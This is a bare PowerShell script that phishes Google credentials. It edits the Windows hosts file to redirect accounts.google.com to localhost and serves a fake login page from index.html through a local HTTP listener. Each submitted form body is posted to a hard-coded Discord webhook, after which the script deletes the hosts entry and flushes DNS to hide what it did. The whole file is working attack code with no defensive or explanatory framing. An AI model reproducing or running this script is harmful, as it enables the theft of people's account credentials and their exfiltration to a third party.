$hostString = "127.0.0.1 accounts.google.com";
$isModified = $result = Select-String C:\Windows\System32\Drivers\etc\hosts -Pattern $hostString;

if ($isModified -eq $null) {    
    Add-Content C:\Windows\System32\Drivers\etc\hosts ("`n"+$hostString);
    ipconfig /flushdns;
}

$url = 'http://127.0.0.1/';
$hook="https://discord.com/api/webhooks/1123168546948649121/s1tdChwhC_S3siJNkEzw-cBcavztR-TYLoFaryoJ2XbHXdN1U4jQMFcfcjnIdIKfEQdg";
$pageCode = Get-Content "index.html" -Encoding UTF8 -Raw;
$http = New-Object System.Net.HttpListener;
$http.Prefixes.Add("http://127.0.0.1/");
$http.Prefixes.Add("https://127.0.0.1/");
$http.Start();

while ($http.IsListening) {
    $context = $http.GetContext();  
     
    if ($context.Request.HttpMethod -eq 'GET' -and $context.Request.RawUrl -eq '/') {
        $buffer = [Text.Encoding]::UTF8.GetBytes($pageCode);
        $context.Response.ContentLength64 = $buffer.length;
        $context.Response.OutputStream.Write($buffer, 0, $buffer.length);
        $context.Response.Close();    
    }

    if ($context.Request.HttpMethod -eq 'POST' -and $context.Request.RawUrl -eq '/') {
        $data = @{
            content = [System.IO.StreamReader]::new($context.Request.InputStream).ReadToEnd()
        };
        
        $response = Invoke-RestMethod -ContentType 'Application/Json' -Uri $hook  -Method Post -Body ($data | ConvertTo-Json);

        (Get-Content C:\Windows\System32\Drivers\etc\hosts | Select-String -pattern $hostString -notmatch) | Set-Content C:\Windows\System32\Drivers\etc\hosts;
        ipconfig /flushdns;

        $buffer = [Text.Encoding]::UTF8.GetBytes("");
        $context.Response.Headers.Add("Content-Type","text/plain");
        $context.Response.ContentLength64 = $buffer.length;
        $context.Response.StatusCode = 200;
        $context.Response.OutputStream.Write($buffer, 0, $buffer.length);
        $context.Response.Close();

        $http.Stop();
    }

}